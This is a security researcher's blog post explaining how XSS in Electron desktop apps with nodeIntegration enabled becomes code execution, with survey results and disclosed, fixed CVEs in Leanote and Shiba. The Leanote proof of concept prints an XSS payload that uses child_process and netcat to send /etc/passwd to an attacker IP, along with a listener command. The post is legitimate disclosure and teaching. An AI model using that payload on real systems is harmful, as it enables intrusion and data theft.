<!DOCTYPE html>
<html lang="en"><!--
 __  __                __                                     __
/\ \/\ \              /\ \             __                    /\ \
\ \ \_\ \   __  __    \_\ \      __   /\_\      __       ___ \ \ \/'\
 \ \  _  \ /\ \/\ \   /'_` \   /'__`\ \/\ \   /'__`\    /'___\\ \ , <
  \ \ \ \ \\ \ \_\ \ /\ \L\ \ /\  __/  \ \ \ /\ \L\.\_ /\ \__/ \ \ \\`\
   \ \_\ \_\\/`____ \\ \___,_\\ \____\ _\ \ \\ \__/.\_\\ \____\ \ \_\ \_\
    \/_/\/_/ `/___/> \\/__,_ / \/____//\ \_\ \\/__/\/_/ \/____/  \/_/\/_/
                /\___/                \ \____/
                \/__/                  \/___/

Powered by Hydejack v8.1.1 <https://hydejack.com/>
--><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"><meta http-equiv="x-ua-compatible" content="ie=edge"><title>Only an Electron Away from Code Execution | Silvia’s blog</title><meta name="generator" content="Jekyll v3.8.3" /><meta property="og:title" content="Only an Electron Away from Code Execution" /><meta name="author" content="Silvia Väli" /><meta property="og:locale" content="en" /><meta name="description" content="This article is supporting my talk at the NorthSec 2018 conference in Montreal titled “Only an Electron Away from Code Execution” and the corresponding slides can be found here." /><meta property="og:description" content="This article is supporting my talk at the NorthSec 2018 conference in Montreal titled “Only an Electron Away from Code Execution” and the corresponding slides can be found here." /><link rel="canonical" href="http://localhost:4000/blog/2018-12-01-electron/" /><meta property="og:url" content="http://localhost:4000/blog/2018-12-01-electron/" /><meta property="og:site_name" content="Silvia’s blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2018-12-01T00:00:00+02:00" /> <script type="application/ld+json"> {"@type":"BlogPosting","headline":"Only an Electron Away from Code Execution","dateModified":"2018-12-01T00:00:00+02:00","datePublished":"2018-12-01T00:00:00+02:00","url":"http://localhost:4000/blog/2018-12-01-electron/","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/blog/2018-12-01-electron/"},"author":{"@type":"Person","name":"Silvia Väli"},"description":"This article is supporting my talk at the NorthSec 2018 conference in Montreal titled “Only an Electron Away from Code Execution” and the corresponding slides can be found here.","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/profile.jpg"},"name":"Silvia Väli"},"@context":"http://schema.org"}</script><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Silvia's blog"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="application-name" content="Silvia's blog"><meta name="msapplication-config" content="/assets/ieconfig.xml"><meta name="theme-color" content="rgb(25,55,71)"><meta name="generator" content="Hydejack v8.1.1" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Silvia's blog" /><link rel="alternate" href="http://localhost:4000/blog/2018-12-01-electron/" hreflang="en"><link rel="shortcut icon" href="/assets/icons/favicon.ico"><link rel="apple-touch-icon" href="/assets/icons/icon.png"><link rel="manifest" href="/assets/manifest.json"><link rel="dns-prefetch" href="https://fonts.googleapis.com"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="dns-prefetch" href="/" id="_baseURL"><link rel="dns-prefetch" href="/assets/js/hydejack-8.1.1.js" id="_hrefJS"><link rel="dns-prefetch" href="/sw.js" id="_hrefSW"><link rel="dns-prefetch" href="/assets/bower_components/fontfaceobserver/fontfaceobserver.standalone.js" id="_hrefFFO"><link rel="dns-prefetch" href="/assets/bower_components/katex/dist/katex.min.js" id="_hrefKatexJS"><link rel="dns-prefetch" href="/assets/bower_components/katex/dist/katex.min.css" id="_hrefKatexCSS"><link rel="dns-prefetch" href="/assets/img/swipe.svg" id="_hrefSwipeSVG"> <script>!function(e,t){"use strict";function n(e,t,n,r){e.addEventListener?e.addEventListener(t,n,r):e.attachEvent?e.attachEvent("on"+t,n):e["on"+t]=n}e.loadJS=function(e,r){var o=t.createElement("script");o.src=e,r&&n(o,"load",r,{once:!0});var a=t.scripts[0];return a.parentNode.insertBefore(o,a),o},e._loaded=!1,e.loadJSDeferred=function(r,o){function a(){e._loaded=!0,o&&n(d,"load",o,{once:!0});var r=t.scripts[0];r.parentNode.insertBefore(d,r)}var d=t.createElement("script");return d.src=r,e._loaded?a():n(e,"load",a,{once:!0}),d},e.setRel=e.setRelStylesheet=function(e){function n(){this.rel="stylesheet"}var r=t.getElementById(e);r.addEventListener?r.addEventListener("load",n,{once:!0}):r.onload=n}}(window,document); !function(a){"use strict";var b=function(b,c,d){function e(a){return h.body?a():void setTimeout(function(){e(a)})}function f(){i.addEventListener&&i.removeEventListener("load",f),i.media=d||"all"}var g,h=a.document,i=h.createElement("link");if(c)g=c;else{var j=(h.body||h.getElementsByTagName("head")[0]).childNodes;g=j[j.length-1]}var k=h.styleSheets;i.rel="stylesheet",i.href=b,i.media="only x",e(function(){g.parentNode.insertBefore(i,c?g:g.nextSibling)});var l=function(a){for(var b=i.href,c=k.length;c--;)if(k[c].href===b)return a();setTimeout(function(){l(a)})};return i.addEventListener&&i.addEventListener("load",f),i.onloadcssdefined=l,l(f),i};"undefined"!=typeof exports?exports.loadCSS=b:a.loadCSS=b}("undefined"!=typeof global?global:this); !function(a){if(a.loadCSS){var b=loadCSS.relpreload={};if(b.support=function(){try{return a.document.createElement("link").relList.supports("preload")}catch(b){return!1}},b.poly=function(){for(var b=a.document.getElementsByTagName("link"),c=0;c<b.length;c++){var d=b[c];"preload"===d.rel&&"style"===d.getAttribute("as")&&(a.loadCSS(d.href,d,d.getAttribute("media")),d.rel=null)}},!b.support()){b.poly();var c=a.setInterval(b.poly,300);a.addEventListener&&a.addEventListener("load",function(){b.poly(),a.clearInterval(c)}),a.attachEvent&&a.attachEvent("onload",function(){a.clearInterval(c)})}}}(this); </script> <script>!function(w, d) { w._noPushState = false; w._noDrawer = false; /**/ loadJS(d.getElementById('_hrefFFO').href, function() { if ('Promise' in w) Promise.all([ new FontFaceObserver('Noto Sans').load(), new FontFaceObserver('Roboto Slab').load(), ]).then(function f() { d.body.classList.add('font-active'); }, function() {}); }); /**/ }(window, document);</script> <!--[if gt IE 8]><!----><link rel="stylesheet" href="/assets/css/hydejack-8.1.1.css"><link rel="stylesheet" href="/assets/icomoon/style.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Slab:400|Noto+Sans:400,400i,700,700i"> <noscript><style> html { font-family: Noto Sans, Helvetica, Arial, sans-serif!important; } h1, h2, h3, h4, h5, h6, .h1, .h2, .h3, .h4, .h5, .h6, .heading { font-family: Roboto Slab, Helvetica, Arial, sans-serif!important; }</style></noscript><style id="_pageStyle"> .content a:not(.btn){color:#4fb1ba;border-color:rgba(79,177,186,0.2)}.content a:not(.btn):hover{border-color:#4fb1ba}:focus{outline-color:#4fb1ba !important}.btn-primary{color:#fff;background-color:#4fb1ba;border-color:#4fb1ba}.btn-primary:focus,.btn-primary.focus,.form-control:focus,.form-control.focus{box-shadow:0 0 0 3px rgba(79,177,186,0.5)}.btn-primary:hover,.btn-primary.hover{color:#fff;background-color:#409ba3;border-color:#409ba3}.btn-primary:disabled,.btn-primary.disabled{color:#fff;background-color:#4fb1ba;border-color:#4fb1ba}.btn-primary:active,.btn-primary.active{color:#fff;background-color:#409ba3;border-color:#409ba3}::selection{color:#fff;background:#4fb1ba}::-moz-selection{color:#fff;background:#4fb1ba}</style><!--<![endif]--><body><div id="_navbar" class="navbar fixed-top"><div class="content"><div class="nav-btn-bar"> <span class="sr-only">Jump to:</span> <a id="_menu" class="nav-btn no-hover fl" href="#_navigation"> <span class="sr-only">Navigation</span> <span class="icon-menu"></span> </a></div></div></div><hr class="sr-only" hidden /> <hy-push-state replace-ids="_main" link-selector="a[href]:not([href*='/assets/']):not(.external):not(.no-push-state)" duration="250" script-selector="script:not([type^='math/tex'])" prefetch ><main id="_main" class="content fade-in layout-post" role="main" data-color="rgb(79,177,186)" data-theme-color="rgb(25,55,71)" data-image="/assets/img/sidebar-bg.jpg" data-overlay ><article id="post-blog-electron" class="page post mb6" role="article"><header><h1 class="post-title"> Only an Electron Away from Code Execution</h1><p class="post-date heading"> <time datetime="2018-12-01T00:00:00+02:00">01 Dec 2018</time> in <a href="/blog/" class="flip-title">Blog</a><div class="hr pb0"></div></header><p>This article is supporting my talk at the <a href="https://nsec.io/speakers/#silvia-v-li">NorthSec 2018</a> conference in Montreal titled “Only an Electron Away from Code Execution” and the corresponding slides can be found <strong><a href="https://docs.google.com/presentation/d/1uJDFQncxCB_0CddZSPVCq7FhKQVH6ku_RuV17Pbm2RU/edit?usp=sharing">here</a></strong>.<p>Electron framework enables to create multi-platform desktop applications by only using web technologies like HTML, JavaScript and CSS. This has allowed the adventurous web application developers to cross the border over to the desktop environment with ease. Big names like Skype, Wire, GitKraken, Slack and so many others have already adopted the framework and tons of open source projects in Github and the ones advertised on the official Electron website have followed. Exploring new frameworks is good, but should be done with good caution! I will explain why.<p>Over the decades, various security techniques to mitigate desktop specific vulnerabilities have been developed, which makes it difficult to successfully exploit traditional desktop applications. Now, when the web technologies have been released into the ‘wild’ a.k.a to the desktop in this case, the web-based vulnerabilities should be reappraised as the consequences can be significantly different than expected. To get to the main part of this article, let me feed you some background information.<h3 id="multi-process-architecture"><strong>Multi-process architecture</strong></h3><p>When I am talking about the Electron framework, it really means talking about its 3 core components: Node.js, the libchromiumcontent module from the Chromium project (the core code needed to render a page) and the V8 JavaScript engine. Similarly to Chromium, Electron uses a multi-process architecture. What this means is that if you take a look at a launched Electron application, you would notice 2 types of processes being created: 1 main process and 1 or multiple renderer processes associated with it. Each of those processes is running concurrently with others and their resources as well as the memory are isolated from eachother. This here works sort of like a safety mechanism.<h4 id="main-process"><strong>Main process</strong></h4><p>To avoid the information overload, let’s focus here on couple of the key points about the processes. The main process in Electron applications is what is responsible for creating and managing web pages and for a life-cycle of events throughout the life-time of the application. Renderer process however is responsible for displaying the chosen content to the user. To paint you a bigger picture of how Electron apps can look like, let’s take the simplest example possible. An Electron app which consists of 3 files: main.js, index.html and package.json.<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Electron</span> <span class="nx">application</span> <span class="nx">example</span><span class="p">:</span>
<span class="p">.</span>
<span class="o">|</span><span class="nx">__</span> <span class="nx">index</span><span class="p">.</span><span class="nx">html</span>
<span class="o">|</span><span class="nx">__</span> <span class="nx">main</span><span class="p">.</span><span class="nx">js</span>
<span class="o">|</span><span class="nx">__</span> <span class="kr">package</span><span class="p">.</span><span class="nx">json</span>    <span class="err">←</span> <span class="nx">application</span><span class="err">’</span><span class="nx">s</span> <span class="nx">entry</span> <span class="nx">point</span>
</code></pre></div></div><p>Package.json is what holds the main script, which in our example is the file called main.js. If not specified, it would always fall back to index.js by default. This is the script which gets executed within the main process. You can imagine it to be the entry point to the application. Now, index.html however is what contains the actual page content we want to display to our user. This would be executed within the renderer process. <strong>A new renderer process is created with every browserWindow instance created in the main process.</strong><p>Electron framework, in order to provide you the desktop-like experience, allows the developers to make use of all the built-in Node.js modules. In addition, it comes with a set of framework specific APIs accessible to the main or to the renderer processes and in some cases to both. The entire list of framework specific APIs which Electron provides you can be found in <a href="https://electronjs.org/docs/api">here</a>. One of those APIs available to the main process is the <a href="https://electronjs.org/docs/api/browser-window">BrowserWindow API</a> from which the BrowserWindow method can be used to create a new page.<p>An example from main.js where new BrowserWindow instance is created with specific size attributes to display the content of index.html:<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="p">{</span><span class="nx">BrowserWindow</span><span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'electron'</span><span class="p">)</span>

  <span class="kd">let</span> <span class="nx">win</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BrowserWindow</span><span class="p">({</span><span class="na">width</span><span class="p">:</span> <span class="mi">800</span><span class="p">,</span> <span class="na">height</span><span class="p">:</span> <span class="mi">600</span><span class="p">})</span>
  <span class="nx">win</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">'closed'</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nx">win</span> <span class="o">=</span> <span class="kc">null</span>
  <span class="p">})</span>

  <span class="nx">win</span><span class="p">.</span><span class="nx">loadURL</span><span class="p">(</span><span class="s1">'....example/index.html'</span><span class="p">)</span>
</code></pre></div></div><h4 id="webpreference-options"><strong>webPreference options</strong></h4><p>Our next piece of the puzzle is to know that with every new BrowserWindow instance, a set of webPreference options becomes available. These options are basically a set of features by which we can control the newly created renderer process.<p>
  <hy-img root-margin="512px"  src="/assets/img/electron/webPreferences.png" alt="" title="WebPreference options" >
    <noscript><img data-ignore  src="/assets/img/electron/webPreferences.png" alt="" title="WebPreference options" /></noscript>
    <span class="loading" slot="loading" hidden>
      <span class="icon-cog"></span>
    </span>
  </hy-img><p>For example:<ul><li><strong>nodeIntegration</strong>: enable/disable Node.js engine (default: True)<li><strong>JavaScript</strong>: enable/disable JavaScript support (default: True)<li><strong>WebSecurity</strong>: enable/disable Same-origin policy (default: True)<li><strong>Sandbox</strong>: enable/disable the sandbox for the renderer process (default: False)</ul><p>Based on the previous example project with 3 files, let’s focus here on the nodeIntegration option and let’s say the content in our index.html file is as shown below. We have a script where we attempt to require the ‘os’ module in order to ask further questions about the platform and the home directory on which the application is running upon.<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
	<span class="kd">var</span> <span class="nx">os</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">"os"</span><span class="p">);</span>
	<span class="kd">var</span> <span class="nx">hostname</span> <span class="o">=</span> <span class="nx">os</span><span class="p">.</span><span class="nx">platform</span><span class="p">();</span>
	<span class="kd">var</span> <span class="nx">homedir</span> <span class="o">=</span> <span class="nx">os</span><span class="p">.</span><span class="nx">homedir</span><span class="p">();</span>
	<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'host'</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span>
    <span class="s1">'Hostname: '</span> <span class="o">+</span> <span class="nx">hostname</span> <span class="o">+</span> <span class="s1">'&lt;/br&gt;'</span><span class="o">+</span> <span class="s1">'Home directory'</span> <span class="o">+</span> <span class="nx">homedir</span> <span class="o">+</span> <span class="s1">'&lt;/br&gt;'</span><span class="p">;</span>
<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></code></pre></div></div><p>If we place this script into a context where we have set <code class="highlighter-rouge">nodeIntegration:True</code> for the renderer process, we see the results to questions we asked for. However disabling the same option results in disabling the Node.js engine and losing the desktop like experience.<p>
  <hy-img root-margin="512px"  src="/assets/img/electron/nodeIntegration.png" alt="" title="NodeIntegration option" >
    <noscript><img data-ignore  src="/assets/img/electron/nodeIntegration.png" alt="" title="NodeIntegration option" /></noscript>
    <span class="loading" slot="loading" hidden>
      <span class="icon-cog"></span>
    </span>
  </hy-img><p>Here it is completely legitimate and the intended behaviour as this is what the framework was designed for us to do. But let’s keep on digging.<h2 id="cross-site-scripting-xss-vulnerability--nodeintegration-hotpot">Cross-site scripting (XSS) vulnerability &amp; nodeIntegration hotpot</h2><p>Cross-site scripting has been around since the 90’s and we can pretty much agree on that fighting against it is pretty much a lost cause, and if there was a button to make XSS disappear, we as the IT security people would most likely not push it (if you know what I mean). It is not every day we are dealing with desktop applications built only by using web technologies. As you might remember, I stated in the beginning of this post that vulnerabilities out of their normal environments should be reappraised as they might end up having unexpected consequences. So let me answer your question: “<strong>Yes, Electron applications can be vulnerable to XSS</strong>”, however it also might end up magically evolving into local or remote code execution as well. So taking our favourite script from the index.html file and sticking it in user input fields can get you further than what the intended behavior of the application really was.<p>
  <hy-img root-margin="512px"  src="/assets/img/electron/xss.png" alt="" title="XSS + nodeIntegration:True" >
    <noscript><img data-ignore  src="/assets/img/electron/xss.png" alt="" title="XSS + nodeIntegration:True" /></noscript>
    <span class="loading" slot="loading" hidden>
      <span class="icon-cog"></span>
    </span>
  </hy-img><h3 id="the-freedom-of-electron">The Freedom of Electron</h3><p>As Electron is suppose to give you the desktop like experience, a lot of the default values of the provided options in the framework make sure that your applications will sort of work “out-of-the-box”. Let me give you an example. So when you launch your Electron app, you can see that by default all the renderer process are always created with NodeIntegration enabled and without the protective layer of the sandbox. This is for your own convenience here. However too much freedom, and we might have a disaster in our hands.<p>
  <hy-img root-margin="512px"  src="/assets/img/electron/freedom.png" alt="" title="XSS + nodeIntegration:True" >
    <noscript><img data-ignore  src="/assets/img/electron/freedom.png" alt="" title="XSS + nodeIntegration:True" /></noscript>
    <span class="loading" slot="loading" hidden>
      <span class="icon-cog"></span>
    </span>
  </hy-img><p>So while doing this project, based on what I observed or sometimes had a ‘gut feeling’ about, I created some assumptions which led me to believe that:<ul><li>developers would not be too much alarmed about the web vulnerabilities occurring in a desktop environment;<li>as applications worked “out-of-the-box”, developers would not be too familiar with any of the webPreference options they were given by default and most likely leave them untouched (these options were optional anyway, sort of).<li>based on the second assumption, if I manage to find XSS then most likely (it will!) evolve into local or remote code execution.</ul><p>To prove my assumptions I took a step further, so bare with me!<h3 id="hunting-for-code-execution">Hunting for code execution</h3><p>.. proved to be easier than I had imagined. I began with 30 applications selected from Github and decided to gather some initial information on the apps I was looking at. You can get more detailed information and specific numbers from my slides, but let’s focus here on the webPreferences and nodeIntegration specifically.<p>What I discovered was that those <strong>30 applications</strong>:<ul><li>created total of <strong>52 new BrowserWindow instances</strong>;<li>webPreferences (<strong>nodeIntegration</strong>):<ul><li>in <strong>41 cases nodeIntegration was left to its default value</strong> of True (therefore left untouched as I assumed);<li>in <strong>5 cases nodeIntegration was set to True</strong> even though this was already its default value;<li>in <strong>6 cases nodeIntegration was set to False</strong>, so I guess these were the cases where developers were actually aware what this option does.</ul></ul><p>Based on those numbers, I had <strong>30 applications and 46 promising chances to go and hunt for the XSS-s</strong> which would evolve into code execution. This also proved my assumption that default options would most likely be left untouched, therfore needing any kind of nodeIntegration bypasses would be extremely rare.<p>As a result I ended up with 10 applications with a XSS vulnerability and out of those 9 were my perfect match: XSS &amp; nodeIntegration:True. So after finding the XSS, it was highly likely that nodeIntegration option would also be enabled.<p>
  <hy-img root-margin="512px"  src="/assets/img/electron/findings.png" alt="" title="XSS + nodeIntegration:True" >
    <noscript><img data-ignore  src="/assets/img/electron/findings.png" alt="" title="XSS + nodeIntegration:True" /></noscript>
    <span class="loading" slot="loading" hidden>
      <span class="icon-cog"></span>
    </span>
  </hy-img><h2 id="poc-leanote---knowledge-blog-sharing-cooperation-all-in-leanote">PoC: Leanote - “Knowledge, Blog, Sharing, Cooperation… all in Leanote”</h2><p>Reported: 25, Nov, 2017<br /> Fixed: 29, Nov 2017 (version 2.6)<p>Leanote is a note-keeping/note-sharing desktop application which by feature allows you to synchronize your data from its web application. The vulnerable field, which led to code execution (<strong>CVE 2017-1000492</strong>) was the title of the created note which the user marked as favourite. This application was a perfect case of a vulnerability not being present in the web application, but as soon as the notes with the attack code were synchronised onto the desktop things got bad.<p>PoC code was presented by using the <a href="https://nodejs.org/api/child_process.html">child_process</a> module from the built-in Node.js modules in order to get a reverse shell connecting back to the attacker’s machine and stealing the victim’s /etc/passwd file.<p>Attacker launched from command line:: <code class="highlighter-rouge">nc -l -p 1337 &gt; passwd.txt</code><br /> Attacker creates a new favourite note with a crafted payload to the victim’s notebook:<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;s &lt;onmouseover="alert(1)"&gt; &lt;s onmouseover="const exec= require('child_process').exec;
exec('nc -w 3 192.168.8.100 1337 &lt; /etc/passwd', (e, stdout, stderr)=&gt; { if (e instanceof Error) {
console.error(e); throw e; } console.log('stdout ', stdout);
console.log('stderr ', stderr);});
alert('1')"&gt;Hallo&lt;/s&gt;
</code></pre></div></div><p>If this is not the easiest code execution you have ever seen, then I don’t know what is!<p>
  <hy-img root-margin="512px"  src="/assets/img/electron/leanote.png" alt="" title="Leanote" >
    <noscript><img data-ignore  src="/assets/img/electron/leanote.png" alt="" title="Leanote" /></noscript>
    <span class="loading" slot="loading" hidden>
      <span class="icon-cog"></span>
    </span>
  </hy-img><h2 id="poc-shiba---rich-markdown-live-preview-app">PoC: Shiba - rich markdown live preview app</h2><p>Reported: 25, Nov, 2017 v1.1.0<br /> Fixed: 30, Nov 2017 (version v1.1.1)<p>Shiba is a markdown editor, where the vulnerable field happened to be the file content field (<strong>CVE 2017-1000491</strong>) itself. So if the attacker manages to trick the victim to open any kind of crafted file within the Shiba app, it’s game over. Let’s use the same PoC code as in the previous example to illustrate better the essence of how easily XSS can evolve into code execution in Electron apps.<p>
  <hy-img root-margin="512px"  src="/assets/img/electron/shiba3_wmv.gif" alt="" title="Shiba - PoC" >
    <noscript><img data-ignore  src="/assets/img/electron/shiba3_wmv.gif" alt="" title="Shiba - PoC" /></noscript>
    <span class="loading" slot="loading" hidden>
      <span class="icon-cog"></span>
    </span>
  </hy-img><h3 id="takeaway--ideas">Takeaway &amp; ideas</h3><p><strong>Takeaways:</strong><ul><li>electron is a wonderful framework for easy multi-platform development for desktop applications, specially if you have never developed for desktop before<li>my personal takeaway was definitely validation to my assumptions.Developers have come to experiement in the new playing field and “old habits die hard”, so the web-vulnerabilities emerge in new environment and quite often<li>if the framework provides you with a lot of freedom for your applications to work “out-of-the-box”, the webprefeence options are most likely left untouched. Even when we are dealing with, let’s say static pages which do not need access to interacting with the system.<li>Electron is a wonderful playing field at the moment with lots of golden findings</ul><p><strong>Ideas:</strong><ul><li>future developement? Limit the attacker’s activities in case of XSS by restricting to require any extra modules than specifically marked in the application’s configuration file.<li>Set nodeIntegration option to False by default:<ul><li>It would need an extra movement from the developers if interaction with the system is necessary within the renderer process. However, if interacting with the system underneath the application is not needed, then the Node.js engine would already be set to false by default (safer option, as devs do not pay enough attention to those options or if its simpy forgotten). This could reduce the potential severity of the cross-site scripting vulnerabilities if such occurrs.</ul></ul><hr /></article><hr class="dingbat related" /><aside class="about related mt4 mb4" role="complementary"><div class="author mt4"> <hy-img src="/assets/img/profile.jpg" class="avatar" alt="Silvia Väli" root-margin="512px" > <noscript><img data-ignore src="/assets/img/profile.jpg" class="avatar" alt="Silvia Väli" /></noscript> <span class="loading" slot="loading" hidden> <span class="icon-cog"></span> </span> </hy-img><h2 class="page-title hr"> About</h2><p>My name is Silvia. This blog just contains various things that interest me, but probably relatively more assembly stuff. I count myself quite new to the ITsec community as I am only 2 years in.<div class="sidebar-social"> <span class="sr-only">Social:</span><ul><li> <a href="https://twitter.com/silviavaliSV" title="Twitter" class="no-mark-external"> <span class="icon-twitter"></span> <span class="sr-only">Twitter</span> </a><li> <a href="https://github.com/silviavali" title="GitHub" class="no-mark-external"> <span class="icon-github"></span> <span class="sr-only">GitHub</span> </a></ul></div></div></aside><aside class="related mb4" role="complementary"><h2 class="hr">Related Posts</h2><ul class="related-posts"><li> <a href="/blog/2019-02-25-blog-SLAE4/" class="h4 flip-title"> <span>Writing a 64-bit custom encoder</span> </a> <time class="heading faded fine" datetime="2019-02-25T00:00:00+02:00">25 Feb 2019</time><li> <a href="/blog/2019-02-25-blog-SLAE3/" class="h4 flip-title"> <span>Egghunter (64-bit Linux) using access() syscall</span> </a> <time class="heading faded fine" datetime="2019-02-25T00:00:00+02:00">25 Feb 2019</time><li> <a href="/blog/2019-01-25-blog-SLAE2/" class="h4 flip-title"> <span>64-bit reverse shell with passphrase protection</span> </a> <time class="heading faded fine" datetime="2019-01-25T00:00:00+02:00">25 Jan 2019</time></ul></aside><footer role="contentinfo"><hr/><p><small class="copyright">© 2019. All rights reserved. </small><p><small>Powered by <a class="external" href="https://hydejack.com/">Hydejack</a> v<span id="_version">8.1.1</span></small><hr class="sr-only"/></footer></main><hy-drawer class="" align="left" threshold="10" touch-events prevent-default ><header id="_sidebar" class="sidebar" role="banner"><div class="sidebar-bg sidebar-overlay" style="background-color:rgb(25,55,71);background-image:url(/assets/img/sidebar-bg.jpg)"></div><div class="sidebar-sticky"><div class="sidebar-about"> <a class="no-hover" href="/" tabindex="-1"> <img src="/assets/img/profile.jpg" class="avatar" alt="Silvia's blog" data-ignore /> </a><h2 class="h1"><a href="/">Silvia's blog</a></h2><p class=""> Random notes or stuff I am curious about.</div><nav class="sidebar-nav heading" role="navigation"> <span class="sr-only">Navigation:</span><ul><li> <a id="_navigation" href="/blog/" class="sidebar-nav-item active" > Blog </a><li> <a href="/about/" class="sidebar-nav-item" > About </a></ul></nav><div class="sidebar-social"> <span class="sr-only">Social:</span><ul><li> <a href="https://twitter.com/silviavaliSV" title="Twitter" class="no-mark-external"> <span class="icon-twitter"></span> <span class="sr-only">Twitter</span> </a><li> <a href="https://github.com/silviavali" title="GitHub" class="no-mark-external"> <span class="icon-github"></span> <span class="sr-only">GitHub</span> </a></ul></div></div></header></hy-drawer><hr class="sr-only" hidden /> </hy-push-state> <!--[if !IE]><!----> <script>loadJSDeferred(document.getElementById('_hrefJS').href);</script> <!--<![endif]--> <script> if ('serviceWorker' in navigator) { navigator.serviceWorker.getRegistration() .then(r => r.unregister()) .catch(() => {}); } </script><h2 class="sr-only" hidden>Templates (for web app):</h2><template id="_animation-template" hidden><div class="animation-main fixed-top"><div class="content"><div class="page"></div></div></div></template> <template id="_loading-template" hidden><div class="loading nav-btn fr"> <span class="sr-only">Loading…</span> <span class="icon-cog"></span></div></template> <template id="_error-template" hidden><div class="page"><h1 class="page-title">Error</h1><p class="lead"> Sorry, an error occurred while loading <a class="this-link" href=""></a>.</div></template> <template id="_back-template" hidden> <a id="_back" class="back nav-btn fl no-hover"> <span class="sr-only">Back</span> <span class="icon-arrow-left2"></span> </a> </template> <template id="_permalink-template" hidden> <a href="#" class="permalink"> <span class="sr-only">Permalink</span> <span class="icon-link"></span> </a> </template></html>
